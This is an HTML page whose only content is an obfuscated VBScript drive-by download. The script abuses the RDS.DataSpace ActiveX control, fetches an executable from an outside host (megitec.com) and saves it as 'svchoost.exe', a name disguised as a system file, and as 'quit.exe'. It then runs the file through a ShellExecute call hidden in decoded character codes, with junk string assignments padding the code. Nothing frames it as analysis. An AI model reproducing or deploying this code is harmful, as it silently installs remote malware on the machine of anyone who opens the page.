<html>
<script language="VBScript">on error resume next
x1="ob"&"je"&"ct"
x2="cl"&"assi"&"d"
x3="cls"&"id:B"&"D96"&"C5"&"56-6"&"5A3-1"&"1D0-9"&"83A-"&"00C"&"04FC"&"29"&"E"&"36"
x4="M"&"i"&"cr"&"o"&"sof"&"t.X"&"M"&"L"&"HT"&"T"&"P"
x5="Shell.Application"
x6="Scri"&"pti"&"ng.Fil"&"eSys"&"tem"&"Obje"&"ct"
Set ec = document.createElement(x1)

e ="http://www.megitec.com/formal.exe"
ec.setAttribute x2, x3
ei=x4
Set ed = ec.CreateObject(ei,"")
s1="A"&"d"&"o"
s2="d"&"b"&"."
s3="St"&"r"
s4="ea"&"m"
ef=s1&s2&s3&s4
eg=ef
set ea = ec.createobject(eg,"")
ea.type = 1
eh="G"&"E"&"T"
ed.Open eh, e, False
ed.Send
e9="svchoost.exe"
set eb = ec.createobject(x6,"")
set ee = eb.GetSpecialFolder(2)
set mm = eb.GetSpecialFolder(0)
mma ="quit.exe"
ea.open
e8="ea.BuildPath(ea,e8)"
e7="eb.BuildPath(eb,e7)"
e6="ec.BuildPath(ed,e6)"
e5="ed.BuildPath(ef,e5)"
e4="ee.BuildPath(eg,e4)"
e3="ef.BuildPath(eh,e4)"
e2="eg.BuildPath(ei,e3)"
e1="eh.BuildPath(eg,e1)"
e0="ei.BuildPath(ek,e0)"
e9= eb.BuildPath(ee,e9)
mma= eb.BuildPath(mm,mma)
ea.write ed.responseBody
ea.savetofile e9,2
ea.savetofile mma,2
ea.close

set ee = ec.createobject(x5,"")

datas="101,101,46,83,104,101,108,108,69,120,101,99,117,116,101,32,101,57,44,34,34,44,34,34,44,34,111,34,38,34,112,34,38,34,101,34,38,34,110,34,44,48"
execute(ChrData(datas))
Function ChrData(Data)
MyArray = Split(Data, ",", -1, 1)
For each OldData in MyArray
  Newdata=NewData&chr(OldData)
Next
ChrData=NewData
End function
</script></html>

